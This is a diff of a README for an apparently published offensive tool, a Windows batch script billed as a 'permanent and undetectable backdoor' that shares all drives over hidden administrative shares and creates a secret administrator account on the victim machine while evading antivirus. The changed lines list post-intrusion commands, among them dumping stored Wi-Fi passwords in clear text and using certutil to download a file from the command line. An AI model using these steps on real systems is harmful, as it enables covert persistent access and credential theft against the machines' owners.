@@ -1,5 +1,5 @@
 # Natural Backdoor for Windows
-# hadmin.bat
+# natural.bat
 Creates permanent and undetectable backdoor over administrative shares on Windoze boxes.
 # What is it?
 It's batch (cmd) file creates a backdoor which use the native features of windows. It does not create any suspicious anomaly indication in the system. It does not get caught by standard antivirus and firewalls. When the script is run with administrator rights, all hard disk drives of the victim computer are shared to the network as a hidden share (Windows administrational share). The hidden share can only be accessed by a secret administrator user created on the victim system. When the script is run on the victim computer, it performs the following operations, respectively.
@@ -27,10 +27,10 @@ You can run commands on the victim computer by taking advantage of the RPC featu
 # Some usefull shell commands
 
 Some functional command examples listed below and [more](https://github.com/security-cheatsheet/cmd-command-cheat-sheet). 
-> fsutil fsinfo drives : Get fixed disk drives list.
-> netsh wlan show profiles : List stored wireless connection profiles.
-> netsh wlan show profile name=<SSID Name> key=clear : Show stored wireless key as clear text.
-> certutil.exe -urlcache -split -f "url" setup.exe : Downloads a file from command line without any external tool.
+> fsutil fsinfo drives : Get fixed disk drives list.\
+> netsh wlan show profiles : List stored wireless connection profiles.\
+> netsh wlan show profile name=<SSID Name> key=clear : Show stored wireless key as clear text.\
+> certutil.exe -urlcache -split -f "url" setup.exe : Downloads a file from command line without any external tool.\
 
 
 
